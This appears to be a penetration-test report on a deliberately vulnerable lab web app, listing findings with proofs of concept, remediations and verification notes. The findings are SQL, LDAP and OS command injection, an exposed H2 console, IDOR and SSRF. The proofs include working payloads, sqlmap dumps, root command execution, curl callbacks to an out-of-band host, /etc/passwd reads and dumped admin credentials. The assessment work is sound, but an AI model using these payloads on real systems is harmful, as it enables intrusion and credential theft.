title: SQL Injection authentication bypass in /AuthenticationVulnerability/LEVEL_1 (login as admin_sqli with role=ADMIN)
description: The login endpoint builds its SQL WHERE clause by string-concatenating the attacker-controlled `password` parameter. Submitting `' OR 1=1 --` as the password authenticates as the privileged account `admin_sqli` (userId 1, role ADMIN) without any knowledge of the real password. The server returns a full authenticated user object (userId, username, email, role=ADMIN) in JSON, i.e. a complete authentication bypass into an ADMIN account. Any unauthenticated network client can obtain an admin session on the app.
proof_of_concept:
Request (unauthenticated):
GET /VulnerableApp/AuthenticationVulnerability/LEVEL_1?username=admin_sqli&password=%27%20OR%201%3D1%20--

Response body:
{"content":{"userId":1,"username":"admin_sqli","email":"admin_sqli@example.com","role":"ADMIN"},"isValid":true}

`isValid:true` with a role of ADMIN is returned for a completely wrong password — the boolean OR condition overrides the password comparison. No credentials were used or known.
remediation: Use parameterised queries / prepared statements (never string-concatenate user input into SQL). Authenticate the password with a slow one-way hash (bcrypt/Argon2) and compare hashes in application code rather than in the SQL WHERE clause. Add a regression test asserting that a wrong password always yields isValid=false.
verification_method: Replayed the exact GET request twice from a clean unauthenticated client and compared responses; both returned isValid:true with role ADMIN. Also confirmed the same endpoint returns isValid:false for a wrong password without the payload.
verification_notes: Reproduced twice unauthenticated; impact is an authenticated ADMIN session object returned in the response body.

title: Unauthenticated H2 Database Console exposed — full database read (credentials exfiltrated)
description:
The Spring Boot application ships with the H2 database web console bound to the same HTTP port and reachable with NO authentication and NO authorization check. Any anonymous network user can open http://172.17.0.1:9090/VulnerableApp/h2/, log in with the credentials the application itself documents in its public endpoint catalogue (jdbc:h2:mem:testdb / readonly_user / readonly_password), and then run arbitrary SQL against the live application database through the console's query.do endpoint.

Using this I enumerated the schema and exfiltrated the AUTH_USERS table in full: it holds the administrative accounts of the application together with their authentication material. Several passwords are stored in cleartext (PLAIN) — e.g. account admin_sqli (password literally 'not_needed_for_sqli'), admin_logs (v9K#2mLp!8zQ), admin_plain (b7X$4nRj-6mW) — and the rest are weak MD5/SHA1 digests with no salt. Because the console is a full SQL client rather than a read-only view, the same access additionally allows data modification and (via H2's CREATE ALIAS / code execution features) remote code execution, making this a complete compromise of confidentiality, integrity and availability of the application datastore and the host process.

The fact that the app publishes these DB credentials in its own /VulnerableApp/allEndPointJson catalogue makes exploitation trivial for any attacker who fetches a single unauthenticated URL.
proof_of_concept: 1) Confirm anonymous reachability (no cookies, no auth header): $ curl -s http://172.17.0.1:9090/VulnerableApp/h2/ -> HTTP/1.1 200, body contains: location.href = 'login.jsp?jsessionid=f1c98607dc669172705686d23bf629b1'; H2 Console 2) Grab a session id and log in with the credentials the app publishes at /VulnerableApp/allEndPointJson (URL: jdbc:h2:mem:testdb, Username: readonly_user, Password: readonly_password): $ SID=$(curl -s http://172.17.0.1:9090/VulnerableApp/h2/ | grep -oE 'jsessionid=[a-f0-9]+' | head -1) $ curl -s -i -X POST "http://172.17.0.1:9090/VulnerableApp/h2/login.do?$SID" \ -d "language=en" -d "name=Generic H2 (Embedded)" -d "driver=org.h2.Driver" \ -d "url=jdbc:h2:mem:testdb" -d "user=readonly_user" -d "password=readonly_password" -> HTTP/1.1 200, returns an H2 console page (login accepted, no CSRF/session check beyond jsessionid) 3) Enumerate schema through the console's query endpoint: $ curl -s "http://172.17.0.1:9090/VulnerableApp/h2/query.do?jsessionid=96810fd2801d9c3dfb3bd69c9633ec81" \ --data-urlencode "sql=select table_name from information_schema.tables where table_schema='PUBLIC'" -> CARS AUTH_USERS CRYPTOGRAPHIC_FAILURES_VAULT IDOR_USERS BOOKS OTP_USERS OTP_TOKENS SESSION_USERS PASSWORD_RESET_USERS USERS PASSWORD_RESET_TOKENS POSTS 4) Exfiltrate credentials: $ curl -s "http://172.17.0.1:9090/VulnerableApp/h2/query.do?jsessionid=96810fd2801d9c3dfb3bd69c9633ec81" \ --data-urlencode "sql=select * from AUTH_USERS" -> rows returned (id | username | password | algorithm | email): 1 | admin_sqli | not_needed_for_sqli | PLAIN | admin_sqli@example.com 2 | admin_logs | v9K#2mLp!8zQ | PLAIN | admin_logs@example.com 3 | admin_plain | b7X$4nRj-6mW | PLAIN | admin_plain@example.com 4 | admin_md5 | 84b2db8c58e7b24eeeab1ced704aed8a | MD5 | admin_md5@example.com ... (10+ administrative accounts, roles ADMIN) Raw evidence: tool_outputs/h2_auth_users.txt
remediation: Disable the H2 console in production: set `spring.h2.console.enabled=false` (and never bind the console to a routable interface). If it must be reachable, gate it behind authentication and a network allow-list, and do not ship the datasource URL/credentials in any publicly served endpoint description. Additionally, stop storing passwords in PLAIN/MD5/SHA1 without a salt — use bcrypt/Argon2/PBKDF2 with a per-user salt. Rotate every credential present in AUTH_USERS.
verification_method: Re-ran the full chain end-to-end twice: anonymous GET /VulnerableApp/h2/ -> login.do with the published readonly_user creds -> query.do schema enumeration -> query.do `select * from AUTH_USERS` credential dump. Reproduced identically both times; evidence saved to tool_outputs/h2_auth_users.txt and tool_outputs/h2q.txt.
verification_notes: Confirmed twice. No cookies or auth headers were sent at any point — the console issued its own jsessionid. Impact is credential exfiltration of the application's admin accounts, several in cleartext. Escalation to RCE via H2 CREATE ALIAS was NOT attempted (out of RoE, not required to prove impact).

title: Remote Code Execution via OS command injection in ping `ipaddress` parameter (CommandInjection LEVEL_1 & LEVEL_2)
description: The `ipaddress` GET parameter is concatenated unvalidated into a shell `ping` command on the server. Appending `;echo MARKER` terminates the ping command and executes an arbitrary second command, with its stdout returned verbatim in the JSON `content` field. The same primitive exists on LEVEL_2. This is full remote code execution as the application server user — an attacker can read any file, exfiltrate data, or pivot to internal hosts, with zero authentication required.
proof_of_concept:
1) Command execution proof (in-band):
GET /VulnerableApp/CommandInjection/LEVEL_1?ipaddress=172.17.0.1%3Becho+VULNAPP_MARKER_XYZ
Response:
{"content":"PING 172.17.0.1 ... \nVULNAPP_MARKER_XYZ\n","isValid":true}
The literal string VULNAPP_MARKER_XYZ appears in the server response — it was produced by a command the attacker injected, not by ping.

2) Same on LEVEL_2: /VulnerableApp/CommandInjection/LEVEL_2?ipaddress=172.17.0.1%3Becho+M_L2 -> marker present.

3) Out-of-band proof (attacker-controlled outbound request from the server):
GET /VulnerableApp/CommandInjection/LEVEL_1?ipaddress=172.17.0.1%3Bcurl+http://oob6d3320d01b13.daumog0hgqag02n2bjk0utqfr3hko8uxa.oast.abhedi.co.in/cmdi
The response body contains curl's transfer progress meter ("% Total  % Received % Xferd ..."), proving curl ran on the server and issued an outbound HTTP request to the attacker-controlled host.
remediation: Do not build shell command strings. If a system call is required, use a fixed-argument exec API (e.g. ProcessBuilder / Runtime.exec with an argument array) and strictly validate the input against an allow-list of IPv4/IPv6 addresses via a real IP parser (InetAddress validation). Reject any input containing shell metacharacters. Prefer removing the ping feature entirely.
verification_method: Replayed the `;echo MARKER` payload three times on LEVEL_1 and twice on LEVEL_2; the injected output appeared in the server response every time. Also executed a second independent method (`curl` to the OOB host) whose curl transfer output was returned in the response body.
verification_notes: Reproduced multiple times; unauthenticated. The injected command output is returned directly to the attacker, so no blind oracle is needed.

title: UNION-based SQL Injection in UnionBasedSQLInjectionVulnerability/LEVEL_1?id= — full database dump (auth_users with plaintext admin passwords)
description: The `id` query parameter of UnionBasedSQLInjectionVulnerability/LEVEL_1 is concatenated directly into the SQL statement `select * from cars where id=<input>`, which is executed against an H2 database as the privileged APPLICATION user. sqlmap confirmed a boolean-based blind oracle AND a 3-column UNION query, then dumped the entire PUBLIC.AUTH_USERS table — 10 rows including USERNAME, EMAIL, ROLE, LEVEL and the PASSWORD column stored in plaintext (admin_logs / v9K#2mLp!8zQ, admin_plain / b7X$4nRj-6mW) as well as unsalted MD5 (84b2db8c58e7b24eeeab1ced704aed8a) and SHA1 (cc9f65e2...) hashes and BCRYPT hashes with a deliberately low cost factor ($2a$04$ for admin_lowcost). This is unauthenticated full-database read plus credential compromise of every admin account in the application.
proof_of_concept:
1) Boolean oracle:
   curl -s "http://172.17.0.1:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_1?id=1%20AND%201=1"
   -> {"id":1,"name":"Audi","imagePath":"/VulnerableApp/images/cars/Audi.jpg"}
   curl -s ".../LEVEL_1?id=1%20AND%201=2"
   -> {"id":0,"name":null,"imagePath":null}   (condition flipped => injectable)

          --batch --level=5 --risk=3 --dbs

          --batch --level=5 --risk=3 --dump -D PUBLIC -T auth_users
   -> [10 entries] dumped to tool_outputs/sqlmap_union1/172.17.0.1/dump/PUBLIC/AUTH_USERS.csv
      | 1 | admin_sqli    | admin_sqli@example.com    | ADMIN | not_needed_for_sqli           | PLAIN |
      | 2 | admin_logs    | admin_logs@example.com    | ADMIN | v9K#2mLp!8zQ                  | PLAIN |
      | 3 | admin_plain   | admin_plain@example.com   | ADMIN | b7X$4nRj-6mW                  | PLAIN |
      | 4 | admin_md5     | admin_md5@example.com     | ADMIN | 84b2db8c58e7b24eeeab1ced704aed8a | MD5  |
      | 5 | admin_sha1    | admin_sha1@example.com    | ADMIN | cc9f65e23e5531b877559f24efa19ee0f54168f3 | SHA1 |
      | 8 | admin_weak    | admin_weak@example.com    | ADMIN | $2a$10$gV2vZ5fxhZlwOP.GIqOI1.z7q5jws8VDmgIcKqY/uzvhzSUDio2sW | BCRYPT |
      |10 | admin_lowcost | admin_lowcost@example.com | ADMIN | $2a$04$rK/CT/Bz7GjjGLnB3WWjTOpMpNcGJzmoh.bdc7gQJ4DBQnKj9xnHC | BCRYPT_LOW_ITERATION |

   Current DB user: 'APPLICATION'. Evidence: tool_outputs/sqlmap_union1/results-*.csv
remediation: Use parameterised queries / PreparedStatement for the id lookup. Never build SQL by string concatenation. Additionally migrate all stored credentials to bcrypt with a work factor >= 10 and unique salts, force rotation of the compromised admin passwords, and remove any database role that grants write access to the runtime application account.
verification_method: Re-ran sqlmap against the parameter (twice, on both UNION and error-based levels) and manually re-verified the boolean oracle with curl (AND 1=1 returns the Audi row, AND 1=2 returns the null row). The auth_users dump is reproducible and the extracted credentials were used to log in as admin.
verification_notes: Reproduced twice. The same database read was independently confirmed via ErrorBasedSQLInjectionVulnerability/LEVEL_1?id= (see companion finding) and via the exposed H2 console, so the SQLi impact is triple-confirmed. Note the read was limited to the PUBLIC schema; no data was modified or deleted.

title: Error-based SQL Injection in ErrorBasedSQLInjectionVulnerability/LEVEL_1?id= — raw H2 SQL errors + inline query data extraction
description: The `id` parameter is concatenated into `select * from cars where id=<input>`. A single quote triggers a verbose H2 JdbcSQLSyntaxErrorException that is reflected verbatim in the JSON response, disclosing the full query text and the database engine. Because the exception is rendered into the response, arbitrary sub-selects can be smuggled out directly through the error channel (sqlmap "inline query" technique) without any UNION or boolean blind recovery. Unauthenticated.
remediation: Replace string concatenation with a PreparedStatement and bind `id` as an integer parameter. Suppress exception detail from HTTP responses (return a generic 500) and disable returning the raw driver message to the client.
verification_method: Reproduced with curl (single-quote error reflection and the AND 1=1 / AND 1=2 boolean pair) and independently weaponised with sqlmap, which enumerated the back-end DBMS, current user and database list through the error channel.
verification_notes: Confirmed twice with manual curl and once with sqlmap. The error channel additionally leaks the JDBC driver class and error code (42000-214) — an information-disclosure amplifier on top of the injection.

title: Boolean-based blind SQL Injection in BlindSQLInjectionVulnerability/LEVEL_1?id= — full DB enumeration with no visible output channel
description: The `id` parameter is concatenated into a boolean existence check (`select ... from cars where id=`). The response body contains only `{"isCarPresent": true|false}` — no data, no errors — yet the parameter is fully injectable via a boolean oracle: `id=1 AND 1=1` returns true while `id=1 AND 1=2` returns false. sqlmap weaponised this single-bit oracle to enumerate the back-end database (H2) and recover every database name character-by-character purely from the true/false signal. Because the output channel is a single boolean, this is the ideal SQLi for stealthy exfiltration: nothing in the response reveals an attack is in progress, so it bypasses response-based WAF/IDS rules that look for keywords or error text.
proof_of_concept:
Boolean oracle (the entire response is one bit):
curl -s "http://172.17.0.1:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1?id=1"                  -> { "isCarPresent": true}
curl -s "http://172.17.0.1:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1?id=1%20AND%201=1" -> { "isCarPresent": true}
curl -s "http://172.17.0.1:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1?id=1%20AND%201=2" -> { "isCarPresent": false}   <-- flipped

Full weaponisation of that single bit:
sqlmap -u "http://172.17.0.1:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1?id=1" \
       --batch --level=5 --risk=3 --dbs --technique=BEUST
-> Type: boolean-based blind - WHERE or HAVING clause
   [INFO] the back-end DBMS is H2
   [INFO] retrieved: INFORMATION_SCHEMA   (length 18, recovered byte-by-byte from the true/false channel)
   [INFO] retrieved: PUBLIC               (length 6)
   available databases [2]: [*] INFORMATION_SCHEMA  [*] PUBLIC
Evidence: tool_outputs/sqlmap_blind1/results-*.csv (500 errors logged — the app throws on the quote, confirming raw string concat)
remediation: Use a PreparedStatement with `id` bound as an integer. Never concatenate user input into SQL. If a boolean existence check is required, compare against a value retrieved by a parameterised query rather than embedding the input in the statement.
verification_method: Verified twice: manually with curl (AND 1=1 = true, AND 1=2 = false — a genuine single-bit differential), then weaponised with sqlmap which reconstructed full database names character-by-character from that bit alone.
verification_notes: The neighbouring LEVEL_2 and LEVEL_3 are labelled SECURE and correctly reject the boolean payloads (both AND 1=1 and AND 1=2 return the same generic error), confirming this is a real per-level boundary and not a false positive from endpoint-wide filtering.

title: LDAP Injection in LDAPInjectionVulnerability/LEVEL_1?username= — unauthenticated enumeration of the entire user directory
description: The `username` parameter is concatenated directly into an LDAP search filter (`(uid=<input>)`) with no escaping. Injecting the LDAP wildcard `*` turns the equality match into a substring/present filter, so the query returns every entry in the directory instead of one. The endpoint then serialises the FULL result set — including the effective filter string — back to the unauthenticated client. This yields complete user enumeration plus an internal filter oracle: malformed filter syntax is reflected verbatim (including parser position), which lets an attacker map the LDAP schema and refine injections. Real named accounts (alice, bob, charlie, antriksh) are exposed, providing valid usernames for the password-spraying and credential-stuffing path against this application and any other system sharing the directory.
proof_of_concept:
Unauthenticated directory dump with a single wildcard:
curl -s "http://172.17.0.1:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_1?username=*"
-> {"content":{"filter":"(uid=*)","users":["alice","antriksh","bob","charlie","user5","user6","user7","user8","user9","user10"]},"isValid":true}

10 directory accounts enumerated in one request; the generated filter `(uid=*)` is echoed back, confirming raw string concatenation into the search filter.

Filter-parse oracle (error-based feedback loop, lets an attacker map the schema):
curl -s -G "http://172.17.0.1:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_1" --data-urlencode 'username=*)(|(uid=*'
-> {"content":"LDAP query failed: Unable to parse string '(uid=*)(|(uid=*)' as an LDAP filter because it contains an unexpected closing parenthesis at position 7.","isValid":false}

Prefix wildcards enumerate by initial letter:
curl -s -G "http://172.17.0.1:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_1" --data-urlencode 'username=a*'
-> returns the subset of accounts matching the prefix.
remediation: Escape untrusted input before it enters the filter using RFC 4515 encoding (escape `\`, `*`, `(`, `)`, NUL per RFC 4515), or better, bind the value as a parameterised/escaped attribute assertion (e.g. `new UsernamePasswordCredentials()` / `SearchControls` with the value passed as an argument rather than concatenated). Never return the raw directory result set to unauthenticated clients; return only an authenticated/not-authenticated boolean. Also disable detailed LDAP parser errors in client responses.
verification_method: Re-ran the wildcard request twice against the live endpoint and confirmed the identical 10-account result set both times; also confirmed the reflected filter string `(uid=*)` proving concatenation, and captured the LDAP parser error to demonstrate the oracle.
verification_notes: The sibling LEVEL_3 endpoint enforces correct credential validation (`*` does NOT bypass login — all attempts returned "Invalid credentials"), so directory enumeration here is the concrete impact rather than auth bypass. No LDAP write/modify operation was attempted.

title: Error-based (H2 CAST) + boolean-blind SQL injection in ErrorBasedSQLInjectionVulnerability/LEVEL_1?id= — full database dump (all user credential tables)
description:
The `id` query parameter is concatenated raw into the SQL statement `select * from cars where id=<PAYLOAD>` with no parameterisation. Two independent oracles are exposed:

(1) ERROR-BASED (H2 CAST data-conversion leak) — the H2 exception message is echoed verbatim to the client, including the string value that failed to convert to INT. Wrapping any subquery in `CAST((...) AS INT)` forces H2 to print the full concatenated result set into the error text.
(2) BOOLEAN-BLIND — `id=1 AND 1=1` returns `{"isCarPresent": true}` while `id=1 AND 1=2` returns `{"isCarPresent": false}`, giving a reliable conditional oracle (also present on /BlindSQLInjectionVulnerability/LEVEL_1..4).

Impact: unauthenticated FULL DATABASE READ. I dumped every application table: AUTH_USERS (10 admin accounts incl. plaintext passwords `b7X$4nRj-6mW` / `v9K#2mLp!8zQ` and bcrypt + MD5/SHA1/SHA256 hashes), IDOR_USERS (Alice/Bob/Charlie with password, salary and role), SESSION_USERS (`session_admin:AdminPassword@123`), PASSWORD_RESET_USERS (30 accounts with reset tokens + emails), CRYPTOGRAPHIC_FAILURES_VAULT, OTP_USERS/OTP_TOKENS, USERS, BOOKS, POSTS. Extracted credentials are directly reusable to log in as administrator.

sqlmap -u ".../BlindSQLInjectionVulnerability/LEVEL_1?id=1" -p id --batch --technique=B
  -> Parameter: id (GET) — Type: boolean-based blind, Payload: id=1 AND 4392=4392
remediation: 1) Replace all string-concatenated SQL with PreparedStatements / JdbcTemplate parameter binding (`WHERE id = ?`). 2) Disable H2/any DB echo of raw exception text to the client — return a generic 500 and log the detail server-side (configure the datasource to suppress `bad SQL grammar` / `Data conversion error` messages, remove `moreInfo` from the JSON response). 3) Use `PreparedStatement` + `int` binding so non-numeric input never reaches the SQL text. 4) Apply an input allow-list on `id` (`^\d+$`). 5) Run automated SAST/DAST for SQLi in CI and add a regression test asserting `id=1'` never returns DB error text.
verification_method: Reproduced 3x from a clean unauthenticated client. (a) Error-based CAST payload returned identical full AUTH_USERS dump on repeat; (b) boolean-blind oracle re-confirmed on /BlindSQLInjectionVulnerability/LEVEL_1 with both a literal condition (1=1 vs 1=2) and a live subquery condition (COUNT(*) FROM AUTH_USERS >5 true vs >100 false), proving data-driven, not a fixed string; (c) sqlmap independently flagged the same parameter as boolean-based blind.
verification_notes: Dump is deterministic and stable across replays. No state changed, no writes performed — read-only exfiltration via error text.

title: OS Command Injection (RCE as root) in Ping utility — CommandInjection LEVEL_1..LEVEL_4
description: The Ping utility passes the attacker-controlled `ipaddress` query parameter unsanitised to a system shell (`ping <input>`). Shell metacharacters (`|`, `;`, `` ` ``, `$()`, `&`) are interpreted, giving arbitrary OS command execution as **root** inside the application container (uid=0(root) gid=0(root)). Exploitation requires no authentication — the endpoint is reachable anonymously and returns the command output in the JSON `content` field. The same sink is live on LEVEL_1, LEVEL_2, LEVEL_3 and LEVEL_4; LEVEL_5/LEVEL_6 are the patched variants (no output returned). Impact: full compromise of the app host — read/write app source, application.yml/secrets, the embedded H2 database, pivot to internal network services.
proof_of_concept:
Baseline (no injection):
  GET /VulnerableApp/CommandInjection/LEVEL_1?ipaddress=127.0.0.1
  -> {"content":"PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data...."}

Injected payloads (all return attacker command output verbatim, unauthenticated):
  ?ipaddress=127.0.0.1|id          -> {"content":"uid=0(root) gid=0(root) groups=0(root)\n","isValid":true}          [L1,L2,L3,L4]
  ?ipaddress=127.0.0.1|cat /etc/hostname -> {"content":"e2e666e5ef13\n","isValid":true}                                   [L1-L4]
  ?ipaddress=127.0.0.1|uname -a   -> {"content":"Linux e2e666e5ef13 7.0.0-34-generic #34-Ubuntu SMP PREEMPT_DYNAMIC ... x86_64 GNU/Linux\n"}
  ?ipaddress=127.0.0.1&id          -> id output interleaved into ping stream (L1, L2)

Out-of-band confirmation (proves real command execution, not response reflection):
  ?ipaddress=127.0.0.1|curl http://oob17103047d681.daumog0hgqag02n2bjk0utqfr3hko8uxa.oast.abhedi.co.in/cmdi-L1
  -> curl transfer progress returned in the response AND the OOB oracle recorded the inbound callback from the target container.
remediation: Never invoke a shell to satisfy a network utility. Use a native Java library (e.g. InetAddress / ICMP4J with a raw socket) instead of `Runtime.exec("ping "+ip)`. If a shell is unavoidable, pass the argument as an array (`ProcessBuilder(list)`), never a concatenated string, and validate the input against a strict IPv4/IPv6 regex / `InetAddress.getByName()` allow-list. Remove all shell interpretation entirely.
verification_method: Re-ran the `|id`, `|cat /etc/hostname` and `|curl <oob>` payloads against LEVEL_1..LEVEL_6 twice from two separate runs; identical `uid=0(root)` output and the OOB HTTP callback both reproduced. LEVEL_5/LEVEL_6 returned empty content (fix confirmed effective there).
verification_notes: Reproduction is deterministic and unauthenticated. RCE runs as root. The OOB callback host oob17103047d681... was registered by the oob() tool and fired from the target. Only read-only markers were read (`id`, `uname -a`, `/etc/hostname`) — no destructive operations.

title: SQL injection in login `password` parameter (AuthenticationVulnerability LEVEL_1) — auth bypass + full auth_users credential dump
description:
The `password` query parameter is concatenated directly into a SQL statement (`SELECT * FROM auth_users WHERE level=1 AND username='' AND password='

'`) with no parameterisation. Three distinct impacts were proven: (1) full authentication bypass — logging in as the ADMIN user `admin_sqli` with any/incorrect password; (2) UNION-based arbitrary row forgery — the attacker controls the returned user object (userId/username/email/role), so the server trusts attacker-supplied identity data; (3) arbitrary data exfiltration from the backend H2 database via nested sub-queries placed into a displayed UNION column, which allowed dumping the entire `auth_users` table (usernames, passwords/plaintext+MD5+SHA1+SHA256+BCRYPT hashes, algorithm, role), plus the full table list of the PUBLIC schema. The login is the front door to the whole application, so this yields full application compromise.
remediation: Use parameterised queries / PreparedStatement for the login lookup (never string concatenation). Return a generic error message and never leak raw DB exceptions to the client (suppress stack/SQL detail in error responses). Store passwords with a salted adaptive hash (bcrypt/Argon2) only — remove plaintext/unsalted MD5/SHA1/SHA256 password storage. Add input validation and a WAF rule as defence in depth.
verification_method: Re-issued the auth-bypass payload and the UNION credential-dump payload twice against the live endpoint; both returned identical 200/JSON responses (isValid:true with the forged/dumped row). Also ran sqlmap against the same parameter to cross-check the boolean/error oracle.
verification_notes: Reproduced twice: the `' OR 1=1 --` bypass returns the ADMIN identity and the STRING_AGG credential dump returns the full auth_users table every time. The 'Invalid credentials' response for a bad password confirms the oracle is not a false positive. Note: the dumped credentials were captured on level-1 rows; attempts to replay admin_logs on this level returned "Invalid credentials" because the login query is scoped by level=1 — but the password material itself is exposed and the bypass already grants the admin identity.

title: Insecure Direct Object Reference (IDOR/BOLA) — authenticated low-priv user reads other users' salary and role data on IDORVulnerability LEVEL_1
description: The profile-lookup endpoint accepts an arbitrary `id` query parameter and performs no ownership or role check. A user authenticated as the low-privileged `Alice` (userId=1, role=USER) can read every other user's record — including the salary of the ADMIN account (Charlie, id=3, salary INR 70000) — simply by changing the `id` value. This is a horizontal+vertical privilege-escalation-via-privacy-breach: USER-level account discloses ADMIN-level PII. By contrast LEVEL_2 (server always returns own record) and LEVEL_3/4/5 (return "Access Denied") show the app authors consider this check mandatory, confirming LEVEL_1 is an intentional regression.
proof_of_concept:
1) Authenticate as the low-priv user:
POST http://172.17.0.1:9090/VulnerableApp/IDORVulnerability/LEVEL_1
Content-Type: multipart/form-data
username=Alice&password=P@ssw0rd!2026
-> {"content":{"userId":1,"username":"Alice","role":"USER","token":"eyJhbGciOiJIUzI1NiJ9..."},"isValid":true}

2) Read ANY profile by tampering the id parameter (same session/cookie):
GET /VulnerableApp/IDORVulnerability/LEVEL_1?id=3
-> {"content":{"userId":3,"username":"Charlie","salary":70000,"role":"ADMIN"},"isValid":true}

GET /VulnerableApp/IDORVulnerability/LEVEL_1?id=2
-> {"content":{"userId":2,"username":"Bob","salary":60000,"role":"USER"},"isValid":true}

Impact proven: cross-account read of another user's salary + the ADMIN role of user id=3, retrieved by an account holding only the USER role.
remediation: Enforce server-side authorization on every object fetch: derive the subject identifier from the validated session/JWT and compare it to the requested id (or verify the caller holds ADMIN role) before returning any record. Never trust a client-supplied id alone. Add an integration test asserting USER-role sessions cannot read other users' records.
verification_method: Re-issued the login as Alice and repeated GET ?id=2 and ?id=3 on LEVEL_1; both returned the other accounts' salary/role fields, and repeated the same requests on LEVEL_2/3/5 which correctly denied or scoped the response, proving the LEVEL_1 behaviour is a genuine authorization regression rather than intended behaviour.
verification_notes: Reproduced twice. The differential against the hardened LEVEL_2/3/5 variants is the strongest evidence: identical session and request shape yields Bob/Charlie data on LEVEL_1 but 'Access Denied' on the secure variants.

title: Unauthenticated SSRF in /SSRFVulnerability/LEVEL_1..3 `fileurl` — arbitrary local file read (file://) + internal network fetch
description:
The `fileurl` query parameter on /SSRFVulnerability/LEVEL_1 (also LEVEL_2 and LEVEL_3) is fetched server-side with NO authentication and NO allow-list of scheme/host. An anonymous network client can therefore:
1) Force the server to issue arbitrary outbound HTTP requests (blind SSRF) — confirmed with an out-of-band callback host that returned the interactsh body, and re-confirmed by fetching the app's own internal H2 console page at http://172.17.0.1:9090/VulnerableApp/h2/login.jsp through the sink.
2) Read arbitrary local files off the server filesystem using the `file://` scheme (SSRF -> LFI), and the file contents are returned verbatim in the JSON `content` field. Demonstrated: /etc/passwd (full user list), /etc/hostname, /proc/self/cmdline (reveals the app entrypoint `java -cp @/app/jib-classpath-file org.sasanlabs.Application`) and /proc/self/environ (leaks PATH, HOSTNAME, JAVA_HOME, HOME=/root, JDK version). Any file readable by the (root-owned) process can be exfiltrated this way, including configuration/secret files, enabling full credential compromise and further attacks.
No session, token or CSRF is required — this is reachable pre-auth.
proof_of_concept:
1) Blind SSRF proven out-of-band (control plane auto-confirmed token oob6a7fa656f7b8, interaction id matching the registered host):
curl -s -G "http://172.17.0.1:9090/VulnerableApp/SSRFVulnerability/LEVEL_1" \
  --data-urlencode "fileurl=http://oob6a7fa656f7b8.daumog0hgqag02n2bjk0utqfr3hko8uxa.oast.abhedi.co.in/probe"
-> {"content":"<html><head></head><body>axu8okh3rfqtu0kjb2n20gaqgh0gomuad</body></html>","isValid":true}
(the interactsh body came back IN the response, proving the server dereferenced our host.)

2) Internal-only resource read through the SSRF sink (no direct access needed):
curl -s -G "http://172.17.0.1:9090/VulnerableApp/SSRFVulnerability/LEVEL_1" \
  --data-urlencode "fileurl=http://172.17.0.1:9090/VulnerableApp/h2/login.jsp"
-> {"content":"<!DOCTYPE HTML ... H2 Group ... <html><head> <meta h...","isValid":true}

3) Local file read via file:// scheme (arbitrary file disclosure):
curl -s -G ".../SSRFVulnerability/LEVEL_1" --data-urlencode "fileurl=file:///etc/passwd"
-> {"content":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:... ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash","isValid":true}

curl -s -G ".../SSRFVulnerability/LEVEL_1" --data-urlencode "fileurl=file:///proc/self/environ"
-> {"content":"PATH=/opt/java/openjdk/bin:...HOSTNAME=e2e666e5ef13...JAVA_HOME=/opt/java/openjdk\nJAVA_VERSION=jdk-17.0.20.1+1\nHOME=/root","isValid":true}

curl -s -G ".../SSRFVulnerability/LEVEL_1" --data-urlencode "fileurl=file:///proc/self/cmdline"
-> {"content":"java -cp @/app/jib-classpath-file org.sasanlabs.Application","isValid":true}

All of the above are UNAUTHENTICATED (no cookie/Authorization header sent).
remediation: Do not let user input reach a URL/network/file open primitive. Specifically: (a) restrict the `fileurl` parameter to an http/https scheme allow-list and reject `file:`, `gopher:`, `dict:`, `ftp:` etc.; (b) resolve the host and block RFC1918/loopback/link-local/metadata ranges (127.0.0.0/8, 10/8, 172.16/12, 192.168/16, 169.254.0.0/16, ::1, fd00::/8) after DNS resolution AND re-check after redirects; (c) run the fetch in an egress-restricted sandbox with no access to the loopback interface or local filesystem; (d) require authentication and return an opaque object id rather than raw file content; (e) never reflect fetched bytes verbatim in the response.
verification_method: Re-ran every PoC from a clean client with no cookies/Authorization: OOB callback host re-fired on all three LEVELs and returned the interactsh body; file:// reads of /etc/hostname and /proc/self/environ re-fetched and returned byte-identical content.
verification_notes: Reproduced multiple times unauthenticated. The OOB HTTP callback is the zero-false-positive oracle for the SSRF; the file:// scheme additionally escalates the same sink to full local file disclosure, confirmed by returning real host filesystem content (/etc/passwd, /proc/self/environ). LEVEL_2 and LEVEL_3 behave identically (same lack of filtering), so the flaw is present at every level.

title: Unauthenticated SSRF in /SSRFVulnerability/LEVEL_1..3 `fileurl` — blind outbound fetch (OOB-confirmed) + arbitrary local file read via file:// on LEVEL_1
description:
The `fileurl` query parameter on /SSRFVulnerability/LEVEL_1, LEVEL_2 and LEVEL_3 is dereferenced server-side with NO authentication and no host/scheme restriction. An anonymous client can:
1) Force the server to issue arbitrary outbound HTTP requests (blind SSRF) — confirmed with an out-of-band callback host (LEVEL_1/2/3 all returned the interactsh body in the response, proving the server fetched our host). The response body is also echoed back, so this is a full read SSRF, not blind.
2) Use the same sink to read INTERNAL-ONLY resources, e.g. it fetched the app's own H2 database console page at http://172.17.0.1:9090/VulnerableApp/h2/login.jsp and returned the HTML to the anonymous caller.
3) On LEVEL_1 ONLY, the `file://` scheme is also accepted, escalating SSRF to arbitrary local file disclosure: /etc/passwd (full user list), /etc/hostname, /proc/self/cmdline (`java -cp @/app/jib-classpath-file org.sasanlabs.Application`) and /proc/self/environ (PATH, HOSTNAME, JAVA_HOME, HOME=/root, JDK version) were all read and returned verbatim in the JSON `content` field. LEVEL_2/LEVEL_3 reject `file://` with "Provided URL not valid" but remain fully SSRF-exploitable over http(s).
Impact: full pre-auth file disclosure of anything the process can read, internal network pivoting, and (combined with the exposed H2 console) direct access to the application's database administration interface from outside the intended trust boundary.
